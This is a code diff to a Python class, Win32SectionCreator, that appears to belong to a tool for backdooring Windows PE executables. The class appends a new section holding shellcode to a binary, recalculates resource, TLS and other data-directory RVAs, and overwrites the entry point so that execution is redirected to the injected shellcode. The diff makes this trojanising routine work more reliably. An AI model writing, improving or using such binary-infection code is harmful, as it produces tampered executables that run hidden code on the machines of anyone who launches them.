@@ -5,7 +5,7 @@ from Utils.MultiByteHandler import  MultiByteHandler
 class Win32SectionCreator():
 
 
-    def _inject_data_at_offset(self, data, offset):
+    def _append_data_at_offset(self, data, offset):
         first_half = self.binary_data[0:offset]
         second_half = self.binary_data[offset:]
         first_half.extend(data)
@@ -162,39 +162,52 @@ class Win32SectionCreator():
         # Adjusting RVA on Data Directories header.
         MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_table_rva, import_table_rva + self.rva_delta)
 
-    def _adjust_resource_table(self, header_offset):
+
+    def _adjust_resource_table_stub(self, header_offset):
+        self._adjust_resource_table(header_offset, 0)
+        # Adjusting RVA on Data Directories header.
         offset_to_resource_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA
         resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header)
+
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header, resource_table_rva + self.rva_delta)
+
+
+    def _adjust_resource_table(self, header_offset, raw_offset_for_directory_header):
+
+        resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA)
 
         if resource_table_rva == 0x0 or self.rva_delta == 0:
             return
 
-        resource_table_raw_offset = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, resource_table_rva)
+        original_raw_offset_for_resource_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, resource_table_rva)
 
-        offset_to_number_of_id_entries_within_resource_directory_type = resource_table_raw_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER
-        number_of_id_entries_within_resource_directory_type = MultiByteHandler.get_word_given_offset(self.binary_data, offset_to_number_of_id_entries_within_resource_directory_type)
-        pointer_to_offset_to_directory_for_id_entry_within_resource_directory_type = offset_to_number_of_id_entries_within_resource_directory_type + 0x2
-        offset_to_offset_to_directory_of_a_type_within_nameid = pointer_to_offset_to_directory_for_id_entry_within_resource_directory_type + 0x4
+        raw_offset_for_current_directory = None
+        #Function being called for the first time
+        if raw_offset_for_directory_header != 0:
+            raw_offset_for_current_directory = raw_offset_for_directory_header
+        else:
+            raw_offset_for_current_directory = original_raw_offset_for_resource_table
 
-        for id_entry_within_resource_directory_type in range(0, number_of_id_entries_within_resource_directory_type):
-            offset_to_directory_of_a_type_within_nameid = 0x7FFFFFFF & MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_offset_to_directory_of_a_type_within_nameid)
-            offset_to_number_of_id_entries_within_nameid = resource_table_raw_offset + offset_to_directory_of_a_type_within_nameid + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER
-            number_of_id_entries_within_nameid = MultiByteHandler.get_word_given_offset(self.binary_data, offset_to_number_of_id_entries_within_nameid)
-            offset_to_offset_of_id_offset_to_directory_for_id_entry_within_nameid = offset_to_number_of_id_entries_within_nameid + 0x2
-            offset_to_offset_to_directory_within_language = offset_to_offset_of_id_offset_to_directory_for_id_entry_within_nameid + 0x4
+        raw_offset_for_current_directory_entry = raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_FIRST_DIRECTORY_ENTRY_WITHIN_RESOURCE_DIRECTORY_HEADER
 
-            for id_entry_within_nameid_language in range(0, number_of_id_entries_within_nameid):
-                offset_to_directory_of_a_type_within_language = 0x7FFFFFFF & MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_offset_to_directory_within_language)
-                offset_to_offset_to_data_entry_within_data_entry = resource_table_raw_offset + offset_to_directory_of_a_type_within_language + Win32BinaryOffsetsAndSizes.OFFSET_TO_OFFSET_TO_DATA_ENTRY_WITHIN_LANGUAGE
-                offset_to_data_entry_within_data_entry = 0x7FFFFFFF & MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_offset_to_data_entry_within_data_entry)
-                offset_to_rva_within_data_entry = resource_table_raw_offset + offset_to_data_entry_within_data_entry
-                rva_of_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_rva_within_data_entry)
-                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_rva_within_data_entry, rva_of_data + self.rva_delta)
-                offset_to_offset_to_directory_within_language += 0x8
-            offset_to_offset_to_directory_of_a_type_within_nameid += 0x8
+        number_of_named_entries = MultiByteHandler.get_word_given_offset(self.binary_data, raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_NAMED_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER)
+        number_of_id_entries = MultiByteHandler.get_word_given_offset(self.binary_data, raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER)
 
-        # Adjusting RVA on Data Directories header.
-        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header, resource_table_rva + self.rva_delta)
+        for entry_index in range(0, number_of_named_entries + number_of_id_entries):
+            offset_to_directory_or_data_entry = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_current_directory_entry + 0x4)
+
+            #print("Offset to directory or data entry:" + hex(offset_to_directory_or_data_entry))
+
+            if offset_to_directory_or_data_entry & 0x80000000 == 0x80000000:# It is a directory so we call this function again
+                self._adjust_resource_table(header_offset, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry & 0x7FFFFFFF)
+            else:
+                resource_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry)
+                MultiByteHandler.set_dword_given_offset(self.binary_data, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry, resource_rva + self.rva_delta)
+            raw_offset_for_current_directory_entry += 0x8
+
+
+
+
 
     def _adjust_exception_table(self, header_offset):
         offset_to_exception_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_EXCEPTION_TABLE_RVA
@@ -309,29 +322,28 @@ class Win32SectionCreator():
         offset_to_tls_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_TLS_TABLE_RVA
         tls_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header)
 
-        if tls_table_rva == 0x0:
+        if tls_table_rva == 0x0 or self.rva_delta == 0:
             return
 
         tls_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, tls_table_rva)
         offset_to_start_address_of_raw_data_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_START_ADDRESS_OF_RAW_DATA_WITHIN_TLS_DIRECTORY
         start_address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory)
-        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory, start_address_of_raw_data + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding)
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory, start_address_of_raw_data + self.rva_delta)
 
         offset_to_end_address_of_raw_data_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_END_OF_ADDRESS_OF_RAW_DATA_WITHIN_TLS_DIRECTORY
         end_address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory)
-        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory, end_address_of_raw_data + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding)
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory, end_address_of_raw_data + self.rva_delta)
 
         offset_to_address_of_index_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_INDEX_WITHIN_TLS_DIRECTORY
         address_of_index = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory)
-        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory, address_of_index + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding)
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory, address_of_index + self.rva_delta)
 
         offset_to_address_of_callbacks_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_CALLBACKS_WITHIN_TLS_DIRECTORY
         address_of_callbacks = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory)
-        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory, address_of_callbacks + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding)
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory, address_of_callbacks + self.rva_delta)
 
         # Adjusting RVA on Data Directories header.
-        if self.rva_delta != 0:
-            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header, tls_table_rva + self.rva_delta)
+        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header, tls_table_rva + self.rva_delta)
 
     def _adjust_load_config_table(self, header_offset):
         offset_to_load_config_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_LOAD_CONFIG_TABLE_RVA
@@ -437,7 +449,7 @@ class Win32SectionCreator():
     def _adjust_data_directories(self, header_offset):
         self._adjust_export_table(header_offset)
         self._adjust_import_table(header_offset)
-        self._adjust_resource_table(header_offset)
+        self._adjust_resource_table_stub(header_offset)
         self._adjust_exception_table(header_offset)
         self._adjust_certificate_table(header_offset)
         self._adjust_base_relocation_table(header_offset)
@@ -573,6 +585,8 @@ class Win32SectionCreator():
         header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)
         beginning_of_last_section_header = Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset)
 
+        self._set_rva_delta(header_offset)
+
         #Computing RVA for last section
         last_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
         last_section_virtual_size = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER)
@@ -582,7 +596,8 @@ class Win32SectionCreator():
         #Computing RAW for last section
         last_section_raw_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_OFFSET_WITHIN_SECTION_HEADER)
         last_section_raw_size = MultiByteHandler.get_dword_given_offset(self.binary_data, beginning_of_last_section_header + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER)
-        new_section_raw_offset = last_section_raw_offset + last_section_raw_size
+        new_section_raw_offset = last_section_raw_offset + last_section_raw_size + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding
+
 
         #RVA for Entrypoint
         offset_for_address_of_entrypoint_rva_on_the_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA
@@ -590,19 +605,19 @@ class Win32SectionCreator():
 
 
         self._file_align_shell_code(header_offset, entrypoint_rva - new_section_rva)
-        self._set_rva_delta(header_offset)
+
         self._adjust_data_directories(header_offset) #When testing just with the new header, adjust certificate table to take into account the shellcode..
         self._adjust_section_headers(header_offset) #Maybe call this one after incrementing the number of sections??
         self._adjust_standard_coff_fields_and_coff_header(header_offset, len(self.shell_code))#<-Size of code
 
         #Injecting header
-        new_initialized_header = self._get_new_header(len(self.shell_code),new_section_rva, len(self.shell_code), new_section_raw_offset)
+        new_initialized_header = self._get_new_header(len(self.shell_code),new_section_rva + self.rva_delta, len(self.shell_code), new_section_raw_offset)
         new_initialized_header.extend([0 for x in range(0,self.header_padding)])
-        self._inject_data_at_offset(new_initialized_header, Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset))  # since the number of sections is now six, this function will return the pointer to the 6th.
+        self._append_data_at_offset(new_initialized_header, Win32BinaryUtils.get_raw_offset_for_last_section_header(self.binary_data, header_offset))  # since the number of sections is now six, this function will return the pointer to the 6th.
 
         #Injecting shellcode
-        self._inject_data_at_offset(self.shell_code, new_section_raw_offset)
-        self._adjust_windows_specific_headers(header_offset, new_section_rva, len(self.shell_code))
+        self._append_data_at_offset(self.shell_code, new_section_raw_offset)
+        self._adjust_windows_specific_headers(header_offset, new_section_rva + self.rva_delta, len(self.shell_code))
 
         #Redirect execution to shellcode
         self._overwrite_entrypoint_rva(header_offset)
